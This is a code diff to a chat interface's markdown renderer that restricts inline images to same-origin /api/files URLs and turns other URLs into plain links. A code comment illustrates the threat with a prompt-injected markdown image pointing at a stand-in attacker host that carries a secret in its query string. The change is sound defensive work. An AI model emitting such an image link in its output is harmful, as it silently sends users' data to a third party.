@@ -50,11 +50,32 @@ function makeComponents(streaming: boolean, muted: boolean): Components {
         <table>{children}</table>
       </div>
     ),
-    // Only API-served media is allowed; never inline base64 into the DOM.
-    img: ({ src, alt }) =>
-      typeof src === 'string' && !src.startsWith('data:') ? (
-        <img src={src} alt={alt ?? ''} loading="lazy" className="max-h-[480px] max-w-full rounded-lg object-contain" />
-      ) : null,
+    // Only same-origin /api/files media is inlined: any other URL would fire a request that can leak data
+    // (e.g. a prompt-injected `![x](https://attacker/?d=secret)`). Everything else degrades to a plain link.
+    img: ({ src, alt }) => {
+      if (typeof src !== 'string') return null
+      if (isApiFileUrl(src)) {
+        return <img src={src} alt={alt ?? ''} loading="lazy" className="max-h-[480px] max-w-full rounded-lg object-contain" />
+      }
+      const label = alt || src
+      return /^https?:\/\//i.test(src) ? (
+        <a href={src} target="_blank" rel="noopener noreferrer">
+          {label}
+        </a>
+      ) : (
+        <span>{alt ?? ''}</span>
+      )
+    },
+  }
+}
+
+/** True for `/api/files/...` on the page's own origin (relative, or absolute with that origin). */
+export function isApiFileUrl(src: string): boolean {
+  try {
+    const u = new URL(src, window.location.origin)
+    return u.origin === window.location.origin && u.pathname.startsWith('/api/files/')
+  } catch {
+    return false
   }
 }
 
